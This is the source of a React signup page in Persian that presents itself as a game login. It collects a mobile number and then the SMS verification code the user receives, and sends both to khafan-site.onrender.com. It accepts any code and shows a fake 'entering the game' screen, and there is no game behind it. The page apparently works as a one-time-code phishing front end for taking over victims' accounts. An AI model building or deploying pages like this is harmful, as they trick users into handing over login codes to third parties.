import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function Register() {
  const [step, setStep] = useState(0);
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const onlyNumbers = (value, max) => {
    return value.replace(/\D/g, "").slice(0, max);
  };

  const sendPhone = async () => {
    if (phone.length !== 11 || !phone.startsWith("09")) {
      alert("شماره معتبر نیست");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch(
        "https://khafan-site.onrender.com/phone",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            phone,
          }),
        }
      );

      const data = await res.json();

      localStorage.setItem("userId", data.id);

      setLoading(false);
      setStep(2);

    } catch (err) {
      console.log(err);
      setLoading(false);
      alert("خطا در اتصال به سرور");
    }
  };

  const verifyCode = async () => {
    if (code.length < 4) {
      alert("کد معتبر نیست");
      return;
    }

    setLoading(true);

    try {
      const userId = localStorage.getItem("userId");

      await fetch(
        `https://khafan-site.onrender.com/code/${userId}`,
        {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            code,
          }),
        }
      );

      setLoading(false);
      setStep(3);

    } catch (err) {
      console.log(err);
      setLoading(false);
      alert("خطا در ذخیره کد");
    }
  };

  return (
    <div className="container">

      <AnimatePresence mode="wait">

        {step === 0 && (
          <motion.div
            key="start"
            className="card"
            initial={{ opacity: 0, scale: 0.7 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
          >
            <h1 className="title">
              ورود به بازی
            </h1>

            <img
              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
              className="logo"
              alt=""
            />

            <button
              className="btn"
              onClick={() => setStep(1)}
            >
              ثبت نام
            </button>
          </motion.div>
        )}

        {step === 1 && (
          <motion.div
            key="phone"
            className="card"
            initial={{ x: 200, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
          >
            <h2>ثبت شماره موبایل</h2>

            <input
              type="tel"
              value={phone}
              maxLength={11}
              placeholder="09928532443"
              onChange={(e) =>
                setPhone(
                  onlyNumbers(
                    e.target.value,
                    11
                  )
                )
              }
            />

            <button
              className="btn"
              onClick={sendPhone}
            >
              ارسال کد
            </button>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div
            key="code"
            className="card"
            initial={{ x: -200, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
          >
            <h2>
              کد تایید را وارد کنید
            </h2>

            <p className="smsText">
              کد از طریق پیامک برای شما ارسال شد
            </p>

            <input
              value={code}
              maxLength={6}
              placeholder="کد تایید"
              onChange={(e) =>
                setCode(
                  onlyNumbers(
                    e.target.value,
                    6
                  )
                )
              }
            />

            <button
              className="btn"
              onClick={verifyCode}
            >
              تایید
            </button>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div
            key="done"
            className="card"
            initial={{
              scale: 1.4,
              opacity: 0,
            }}
            animate={{
              scale: 1,
              opacity: 1,
            }}
          >
            <h2 className="success">
              ثبت نام شما انجام شد
            </h2>

            <div className="typing">
              در حال ورود به بازی...
            </div>

            <div className="loader"></div>
          </motion.div>
        )}

      </AnimatePresence>

      {loading && (
        <div className="overlay">
          <div>
            <div className="loader"></div>

            <div className="loadingText">
              در حال پردازش...
            </div>
          </div>
        </div>
      )}

    </div>
  );
}